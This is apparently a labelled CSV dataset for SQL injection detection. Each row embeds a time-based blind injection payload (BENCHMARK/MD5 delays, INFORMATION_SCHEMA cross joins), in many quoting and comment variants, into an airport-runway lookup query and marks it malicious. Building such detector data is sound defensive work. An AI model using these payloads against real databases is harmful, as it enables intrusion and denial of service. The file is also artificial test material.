full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e))-- JPDi"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e)) AND (5723=5723"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e)) AND ((9647=9647"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport))) OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e)) AND (((2513=2513"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e))"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e))-- SCic"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e))# vCgW"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) WHERE 6592=6592 OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e))-- ANKw"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport WHERE 3878=3878 OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e))-- SRaQ"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT Uvjh WHERE 2548=2548 OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e)))+"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AS pHvm WHERE 9125=9125 OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e))-- Yijn"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AS cWlP WHERE 4155=4155 OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e))-- fEAh"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport` WHERE 1389=1389 OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e))-- HKRf"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`) WHERE 2712=2712 OR 2855=BENCHMARK(5000000,MD5(0x5a594e4e))-- TSpX"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- sIdW"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- ldOA"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- gbQi"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND ('NuCS'='NuCS"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND (('WHDq'='WHDq"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND ((('WcmN'='WcmN"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND 'wKYv'='wKYv"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND ('onrU' LIKE 'onrU"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND (('MsWC' LIKE 'MsWC"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND ((('GKVI' LIKE 'GKVI"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport%' OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND 'JNpb%'='JNpb"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND 'qfGp' LIKE 'qfGp"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND (""PtZf""=""PtZf"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND ((""sNMB""=""sNMB"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""))) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND (((""LXmo""=""LXmo"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND ""kjyX""=""kjyX"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND (""OGth"" LIKE ""OGth"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND ((""iqEw"" LIKE ""iqEw"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""))) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND (((""yinK"" LIKE ""yinK"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND ""gkDa"" LIKE ""gkDa"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) OR 'mDAE'='YtjC"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') WHERE 9802=9802 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- FqyZ"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") WHERE 4323=4323 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- PlCm"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' WHERE 1615=1615 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- bRmr"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" WHERE 3065=3065 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- TrlG"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x56717865 WHERE 9113=9113 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1))||'"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x506b6a41 FROM DUAL WHERE 1131=1131 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1))||'"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'+(SELECT 0x4a766b6c WHERE 6767=6767 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1))+'"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x6b754877 FROM DUAL WHERE 5548=5548 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1))||"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x4d5a7751 WHERE 6247=6247 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1))||"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT 0x4a687075 WHERE 4969=4969 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1))+"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AS Bqvp WHERE 5910=5910 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- ceJq"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AS oBiG WHERE 8033=8033 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- ykAT"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AS vQdt WHERE 7320=7320 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- rcfC"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AS kALX WHERE 1242=1242 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- vuAh"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' IN BOOLEAN MODE) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- AGWS"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND (8693=8693"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND ((8308=8308"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport))) OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND (((4117=4117"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- jZlT"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)# fnwr"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) WHERE 4659=4659 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- flIf"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport WHERE 3169=3169 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- UsDt"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT HMPE WHERE 9306=9306 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1))+"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AS BFxM WHERE 3432=3432 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- HCBT"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AS kxaq WHERE 7495=7495 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- ZttR"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport` WHERE 7127=7127 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- AcLM"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`) WHERE 4528=4528 OR 8191=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- SzIj"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport%' AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""))) AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') WHERE 9327=9327 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") WHERE 3490=3490 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' WHERE 9870=9870 AND 5418=BENCHMARK(5000000,MD5(0x4d765759))#"");",1,airport-S12,Unknown,Unknown
